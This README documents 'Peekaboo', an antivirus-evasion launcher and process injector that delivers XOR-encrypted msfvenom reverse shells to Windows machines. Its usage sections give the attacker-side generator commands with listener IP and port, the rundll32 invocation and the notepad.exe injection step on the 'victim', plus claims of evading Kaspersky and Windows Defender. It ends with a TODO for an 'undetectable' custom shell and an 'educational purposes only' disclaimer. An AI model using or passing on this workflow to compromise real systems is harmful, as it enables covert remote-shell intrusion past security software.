# Peekaboo

Simple undetectable shellcode and code injector launcher example. Inspired by RTO malware development course.

## Main logic

XOR encryption and decryption for functions call and main payload - `msfvenom` reverse shell as example.

## Usage
## 1. DLL
### on attacker machine

check your IP:
```bash
ip a
```

![attacker machine IP](./screenshots/1.png?raw=true)

run python script with flags:
```bash
python3 peekaboo.py -l 10.9.1.6 -p 4444
```

![run python script](./screenshots/2.png?raw=true)

### then on victim machine (windows x64):
run on powershell or cmd promt:
```cmd
rundll32 .\peekaboo.dll, BMzUWjfJOsdaiCQzbTLM
```

![run on victim machine](./screenshots/3.png?raw=true)

### check on attacker machine:
check your netcat listener:

![check netcat listener](./screenshots/4.png?raw=true)

example:
![final](./screenshots/5.png?raw=true)

## 2.Injector
### on attacker machine:
check attacker ip:
```bash
ip a
```

![check IP](./screenshots/6.png?raw=true)

run python script on linux (for example process `notepad.exe`):
```bash
python3 peekaboo-inj.py -l 10.9.1.6 -p 4444 -e notepad.exe
```

![encrypting](./screenshots/7.png?raw=true)

compile in VS - windows machine x64:
```cmd
.\compile-inj.bat
```

![compile in attacker windows x64](./screenshots/8.png?raw=true)

### then on victim machine (windows x64):
```cmd
.\peekaboo.exe
```

or click

![run on victim machine](./screenshots/9.png?raw=true)

### check on attacker machine:
check your netcat listener:

![check netcat listener](./screenshots/10.png?raw=true)

## Issues.
Tested on:
1. Attacker machines: Kali linux 2020.1, Windows 10 x64
2. Victim machine: Windows 7 x64, Windows 10 x64
3. Payload: windows x64 reverse shell from msfvenom
4. AV Engines: Kaspersky, Windows Defender, Norton Commander

# Virus Total result:
02 september 2021

![virustotal](./screenshots/11.png?raw=true)

## TODO
- [ ] Compile injector in Kali linux
- [ ] Implement custom variations of `GetProcAddress` and `GetModuleHandle` functions 
- [ ] Replace msfvenom shell to custom undetectable

## Attention
This tool is a Proof of Concept and is for Educational Purposes Only!!! Author takes no responsibility of any damage you cause

## License
[MIT](https://choosealicense.com/licenses/mit/)
